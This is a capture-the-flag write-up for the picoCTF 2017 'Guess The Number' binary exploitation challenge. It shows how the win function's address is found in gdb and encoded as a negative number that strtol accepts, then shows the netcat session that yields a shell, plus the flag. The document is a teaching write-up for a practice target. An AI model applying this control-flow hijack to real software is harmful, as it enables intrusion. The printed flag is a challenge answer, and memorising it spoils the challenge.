# Guess The Number
## level 2 - binary exploitation - 75 points

### Description
> Just a simple number-guessing game. How hard could it be? [Binary](./data/guess_num) [Source](./data/guess_num.c). Connect on shell2017.picoctf.com:30919.

### Hints
> * What is the program doing with your input number?
> * strtol checks for overflow but it does allow negative numbers...

### Solution

The code is slightly different from previous challenges: in this one instead of providing shellcode to execute we have to submit the address of the pointer of `win` function to get the shell.

First of all, let's find `win` function address with `gdb`:

```
$ gdb guess_num
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
...
Reading symbols from guess_num...(no debugging symbols found)...done.
(gdb) print win
$1 = {<text variable, no debug info>} 0x804852b <win>
```

So the address is `0x804852b`. Before execute the instruction at pointer we gave it shifts right by 4 bits, so before submitting we have to shift left by 4. The result decimal number is 2,152,223,408.

Sadly t,he number we found overflows 32-bit `long` type, so `strtol` cuts it to 2,147,483,647 (2^31 - 1). So what can we do?

The binary representation of the "address number" is `10000000010010000101001010110000`. We know that the most significant bit is used for sign control, so we can convert the number in decimal removing last bit, then add to the minimum 32-bit `long` plus one (the overflow) to get the number to submit. The "address number" without sign bit in decimal is 4,739,760, then the number to submit will be -2,142,743,888:

```
$ nc shell2017.picoctf.com 30919
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ cat flag.txt
d1ec8d4078eac1112548c1a6a00cfe07
```

### Flag
```
d1ec8d4078eac1112548c1a6a00cfe07
```